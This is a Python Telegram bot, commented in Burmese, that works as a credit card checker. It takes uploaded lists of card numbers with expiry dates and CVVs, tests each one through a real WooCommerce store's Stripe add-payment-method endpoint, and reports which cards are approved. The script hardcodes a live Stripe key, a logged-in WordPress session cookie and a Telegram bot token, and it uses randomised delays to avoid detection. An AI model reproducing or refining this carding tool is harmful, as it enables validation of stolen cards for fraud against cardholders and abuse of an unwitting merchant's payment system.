import aiohttp
import asyncio
import json
import random
import os
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

# ===================== CONFIGURATION =====================
load_dotenv()

DOMAIN = os.getenv("DOMAIN", "https://dainte.com")
PK = os.getenv("STRIPE_PK", "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf")

# ===================== ORIGINAL CARD CHECKING FUNCTIONS =====================

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json_data=None,
):
    try:
        async with session.request(
            method,
            url,
            params=params,
            headers=headers,
            data=data,
            json=json_data,
        ) as response:
            return await response.text(), response.status
    except Exception as e:
        return None, 0

async def ppc(cards, card_num, total_cards):
    """မူရင်း card checking function"""
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]
    cc = cc.replace(" ", "")

    cookies = {
        '_gcl_au': '1.1.1390503211.1765951324',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-12-17%2005%3A32%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdainte.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdainte.com%2F',
        'sbjs_first_add': 'fd%3D2025-12-17%2005%3A32%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdainte.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdainte.com%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        '_ga': 'GA1.1.1266478631.1765951325',
        'tk_ai': 'LaEUcf+uHuLLEv8nDuZ++YlO',
        '__stripe_mid': 'df552a5d-837a-4c22-8b94-6e0c6126fe57fc8cb8',
        '__stripe_sid': '40098deb-638d-48d0-b1ad-8a99af0d8cbeb99daf',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36',
        '_lscache_vary': 'fe945544100d8ff68c3bab5f9d991cf8',
        'wordpress_logged_in_6d38d63c396edb46dc077c5e4dd298a7': 'ohmyqueenmedusa%7C1766556437%7CzJQumMwlWkTb2WjElYB3ftRAcQcOwxlHPiwELPUvQTD%7C934b3951bd21b3559e879e24c3996e064e00a2f28d57851391e999db0c079d09',
        'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdainte.com%2Fmy-account%2Fpayment-methods%2F',
        '_ga_0PCFHXZV00': 'GS2.1.s1765951324$o1$g1$t1765951669$j31$l0$h0',
        'tk_qs': '',
        '_uetsid': 'ea8f3740db0d11f09ea82f57fd1361ff',
        '_uetvid': 'ea906540db0d11f09dc0c3bce871cd9b',
    }

    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        cookies=cookies
    ) as session:

        # Step 1: Get the payment method page
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        }

        req, status = await make_request(
            session,
            url=f"{DOMAIN}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        
        if req is None:
            return f"❌ [{card_num}/{total_cards}] Failed to get payment method page"
        
        setup_intent_nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
        if setup_intent_nonce == "None":
            return f"❌ [{card_num}/{total_cards}] No setup intent nonce found"

        await asyncio.sleep(random.uniform(2, 4))

        # Step 2: Create payment method with Stripe
        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        }

        data2 = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "billing_details[name]": "Test User",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": DOMAIN,
            "time_on_page": "187650",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }

        req2, status2 = await make_request(
            session,
            "https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        
        if req2 is None:
            return f"❌ [{card_num}/{total_cards}] Failed to create payment method"
            
        try:
            pm_data = json.loads(req2)
            if 'error' in pm_data:
                return f"❌ [{card_num}/{total_cards}] Stripe error: {pm_data['error']['message']}"
            pmid = pm_data.get('id')
            if not pmid:
                return f"❌ [{card_num}/{total_cards}] No payment method ID"
        except json.JSONDecodeError:
            return f"❌ [{card_num}/{total_cards}] Invalid JSON response from Stripe"

        await asyncio.sleep(random.uniform(1, 2))

        # Step 3: Send to WooCommerce admin-ajax.php
        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        data3 = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_intent_nonce,
        }

        req3, status3 = await make_request(
            session,
            url=f"{DOMAIN}/wp-admin/admin-ajax.php",
            headers=headers3,
            data=data3,
        )
        
        if req3:
            try:
                result_data = json.loads(req3)
                if result_data.get('success'):
                    return f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
                else:
                    # Extract error message from JSON response
                    error_msg = "Unknown error"
                    try:
                        if 'data' in result_data and 'error' in result_data['data']:
                            error_msg = result_data['data']['error']['message']
                        elif 'message' in result_data:
                            error_msg = result_data['message']
                    except:
                        error_msg = str(result_data)
                    
                    return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
            except json.JSONDecodeError:
                return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {req3}"
        
        return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗡𝗼 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗳𝗿𝗼𝗺 𝘀𝗲𝗿𝘃𝗲𝗿"

# ===================== TELEGRAM BOT FUNCTIONS =====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = (
        "send file now"
    )
    await update.message.reply_text(welcome_text)

async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming text files"""
    document = update.message.document
    
    # Accept only .txt files
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ .txt ဖိုင်သာ ပို့ပါ")
        return
    
    await update.message.reply_text("📥 ဖိုင်လက်ခံရရှိပြီး၊ စစ်ဆေးနေပါ...")
    
    # Download the file
    file = await document.get_file()
    temp_file = f"temp_{document.file_name}"
    await file.download_to_drive(temp_file)
    
    try:
        # Read card numbers
        with open(temp_file, 'r', encoding='utf-8') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            await update.message.reply_text("❌ ဖိုင်အလွတ် သို့မဟုတ် ပုံစံမှားယွင်းနေပါတယ်")
            return
        
        total_cards = len(cards)
        await update.message.reply_text(f"🔍 ကတ်အရေအတွက်: {total_cards}\nစစ်ဆေးနေပါ...")
        
        approved = 0
        declined = 0
        results = []
        
        # Check each card
        for i, card in enumerate(cards, 1):
            result = await ppc(card, i, total_cards)  # ✅ အခု ppc function ကို ခေါ်နိုင်ပါပြီ
            results.append(result)
            
            if "✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥" in result:
                approved += 1
            else:
                declined += 1
            
            # Send results every 10 cards
            if i % 10 == 0 or i == total_cards:
                await update.message.reply_text('\n'.join(results[-10:]))
            
            # Delay between cards (as in original code)
            if i < total_cards:
                await asyncio.sleep(random.uniform(10, 15))
        
        # Final summary
        summary = [
            "🎯 စစ်ဆေးမှု ပြီးဆုံးပါပြီ",
            f"✅ အောင်မြင်သော ကတ်များ: {approved}",
            f"❌ ငြင်းပယ်ခံရသော ကတ်များ: {declined}",
            f"📊 အောင်မြင်မှုရာခိုင်နှုန်း: {(approved/total_cards)*100:.1f}%"
        ]
        await update.message.reply_text('\n'.join(summary))
        
    except Exception as e:
        await update.message.reply_text(f"❌ အမှားတစ်ခု ဖြစ်ပွားခဲ့ပါ: {str(e)}")
    finally:
        # Clean up temp file
        if os.path.exists(temp_file):
            os.remove(temp_file)

# ===================== MAIN FUNCTION =====================

def main():
    """Start the bot"""
    # Get Bot Token from environment variable
    BOT_TOKEN = "8569583023:AAFNKM3mkumVNrpj9uOZ-32fV3sP3nZ0TSo"
    
    if not BOT_TOKEN:
        print("❌ Error: BOT_TOKEN environment variable is not set!")
        print("Please set it in your .env file or environment variables.")
        return
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command and message handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_text_file))
    
    # Start the bot
    print("🤖 Bot စတင်နေပါတယ်...")
    print("Press Ctrl+C to stop")
    app.run_polling()

if __name__ == "__main__":
    main()
